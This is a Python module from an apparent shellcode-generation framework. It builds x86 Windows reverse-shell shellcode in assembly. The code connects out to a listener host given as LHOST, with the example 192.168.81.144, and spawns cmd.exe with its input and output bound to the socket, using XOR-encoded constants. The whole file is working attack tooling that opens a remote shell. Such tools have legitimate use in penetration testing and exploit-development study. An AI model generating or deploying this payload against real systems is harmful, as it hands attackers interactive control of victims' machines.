import sys
import ctypes
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.programmer import builder
from sickle.common.lib.programmer import stubhub

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    ws2def,
    winsock2,
    processthreadsapi,
)

class Shellcode():

    arch = "x86"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = []

    summary = ("Reverse shell via TCP over IPv4 that provides an interactive cmd.exe "
               "session")

    description = ("A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe"    
                   " session. Since this payload is not staged, there is no need for anything"
                   " more than a Netcat listener.")

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    advanced = {}
    advanced["EXITFUNC"] = {}
    advanced["EXITFUNC"]["optional"] = "yes"
    advanced["EXITFUNC"]["description"] = "Exit technique"

    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
                                        "func": "Have the shellcode operate as function",
                                        "thread": "Exit as a thread",
                                        "process": "Exit as a process" }

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "CreateProcessA",
            ],
            "Ws2_32.dll": [
                "WSAStartup",
                "WSASocketA",
                "connect",
            ]
        }

        self.set_args()

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({ 
            "wsaData"                       : 0x00,
            "name"                          : ctypes.sizeof(ws2def.sockaddr),
            "lpStartupInfo"                 : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
            "lpCommandLine"                 : len("cmd\x00"),
            "lpProcessInformation"          : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

        return

    def set_args(self):
        """Configure the arguments that may be used by the shellcode stub
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        argv_dict.update(modparser.argument_check(Shellcode.advanced, self.arg_list))
        if (argv_dict == None):
            exit(-1)

        # Configure the options used by the host to obtain the callback
        if ("LPORT" not in argv_dict.keys()):
            self.lport = 4242
        else:
            self.lport = int(argv_dict["LPORT"])

        self.lhost = argv_dict['LHOST']

        # Set the EXITFUNC and update the necessary dependencies
        if "EXITFUNC" not in argv_dict.keys():
            self.exit_func = "terminate"
        else:
            self.exit_func = argv_dict["EXITFUNC"] 

        if self.exit_func == "terminate":
            self.dependencies["Kernel32.dll"] += "TerminateProcess",
        elif self.exit_func == "thread":
            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
        elif self.exit_func == "process":
            self.dependencies["Kernel32.dll"] += "ExitProcess",

        return 0

    def gen_main(self):
        """Returns assembly source code for the main functionality of the stub
        """

        # Setup the members of the sockaddr structure 
        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
        sin_port = struct.pack('<H', self.lport).hex()
        sin_family = struct.pack('>H', ws2def.AF_INET).hex()

        src = f"""
; EAX => WSAStartup([in]  WORD      wVersionRequired,
;                   [out] LPWSADATA lpWSAData);
call_WSAStartup:
    mov eax, [ebp - {self.storage_offsets['WSAStartup']}]

    lea ecx, [ebp - {self.storage_offsets['wsaData']}]
    push ecx

    xor ecx, ecx
    mov cx, 0x202
    push ecx

    call eax

; EAX => WSASocketA([in] int                 af,
;                   [in] int                 type,
;                   [in] int                 protocol,
;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
;                   [in] GROUP               g,
;                   [in] DWORD               dwFlags);
call_WSASocketA:
    mov eax, [ebp - {self.storage_offsets['WSASocketA']}]
    xor ecx, ecx
    push ecx
    push ecx
    push ecx
    mov cl, {ws2def.IPPROTO_TCP}
    push ecx
    mov cl, {winsock2.SOCK_STREAM}
    push ecx
    mov cl, {ws2def.AF_INET}
    push ecx
    call eax

    mov esi, eax ; Save the socket file descriptor (sockfd)\n"""

        # Generate a value that will be XOR'd by 0xFFFFFFFF in order to get the
        # original value for:
        #
        #   sin_port | sin_family
        #   STARTF_USESTDHANDLES
        #   "cmd"
        #
        # These values will then have to be XOR'd by 0xFFFFFFFF
        xor_sockaddr = hex(int(f"{sin_port}{sin_family}", 16) ^ 0xFFFFFFFF)
        xor_std_handles = hex(int(f"{processthreadsapi.STARTF_USESTDHANDLES}", 16) ^ 0xFFFFFFFF)
        xor_cmd = hex(0x646d63 ^ 0xFFFFFFFF)

        src += f"""
; EAX => connect([in] SOCKET s,
;                [in] const sockaddr *name,
;                [in] int namelen);
call_connect:
    xor ecx, ecx
    mov cl, {ctypes.sizeof(ws2def.sockaddr)}
    push ecx
    mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {sin_addr}

    mov eax, 0xffffffff
    xor eax, {xor_sockaddr}

    mov dword ptr [ebp - {self.storage_offsets['name']}], eax
    lea ecx, [ebp - {self.storage_offsets['name']}]
    push ecx
    push esi
    mov eax, [ebp - {self.storage_offsets['connect']}]
    call eax

; [EBX] => typedef struct _STARTUPINFOA {{ }}
setup_STARTUPINFOA:
    lea ebx, [ebp - {self.storage_offsets['lpStartupInfo']}]

memsetStructBuffer:
    lea edi, [ebp - {self.storage_offsets['lpStartupInfo']}]
    xor eax, eax
    xor ecx, ecx
    mov cl, {int( ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04 )}
    rep stosd

initMembers:
    mov al, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
    mov [ebx], eax
    mov eax, 0xffffffff
    xor eax, {xor_std_handles}
    mov [ebx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], esi
    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], esi
    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], esi

; EAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,
;                       [in, out, optional] LPSTR                 lpCommandLine,
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
;                       [in]                BOOL                  bInheritHandles,
;                       [in]                DWORD                 dwCreationFlags,
;                       [in, optional]      LPVOID                lpEnvironment,
;                       [in, optional]      LPCSTR                lpCurrentDirectory,
;                       [in]                LPSTARTUPINFOA        lpStartupInfo,
;                       [out]               LPPROCESS_INFORMATION lpProcessInformation);
call_CreateProccessA:
    lea ecx, [ebp - {self.storage_offsets['lpProcessInformation']}]
    push ecx
    push ebx
    xor ecx, ecx
    push ecx
    push ecx
    push ecx
    inc ecx
    push ecx
    dec ecx
    push ecx
    push ecx
    lea ecx, [ebp - {self.storage_offsets['lpCommandLine']}]
    mov eax, 0xffffffff
    xor eax, {xor_cmd}
    mov dword ptr [ecx], eax
    push ecx
    xor ecx, ecx
    push ecx
    mov eax, [ebp - {self.storage_offsets['CreateProcessA']}]
    call eax\n"""

        return src

    def get_shellcode(self):
        """Generates Shellcode
        """

        generator = Assembler(Shellcode.arch)
        win_stubs = stubhub.WinRawr(self.storage_offsets,
                                    self.dependencies,
                                    self.stack_space,
                                    self.exit_func)

        main_src = self.gen_main()
        src = win_stubs.gen_source(main_src)
        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
